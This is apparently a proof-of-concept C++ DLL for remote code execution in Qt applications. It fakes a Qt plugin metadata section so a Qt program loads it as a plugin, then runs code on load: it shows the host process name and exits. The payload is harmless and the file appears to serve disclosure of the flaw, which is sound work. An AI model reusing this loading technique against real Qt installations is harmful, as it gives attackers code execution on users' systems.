// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

// the qt metadata section that's required for plugins to load
#pragma const_seg(".qtmetad")

// just a marker so we find the section easily, we'll fill this later manually
const unsigned char qtMetadSectionData[512] = { '1', '3', '3', '7' };

// change the const data section back to what it was
#pragma const_seg(".rdata")

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	TCHAR szFileName[MAX_PATH];
	
	// reference the metadata section data array so the compiler doesn't 'optimize' it
	(void)qtMetadSectionData;
    
	switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

		// get the process file name
		GetModuleFileName(NULL, szFileName, MAX_PATH);

		// show it
		MessageBox(0, szFileName, L"Qt RCE PoC :o", 0);

		// exit the process before it's visible
		ExitProcess(0);
		break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

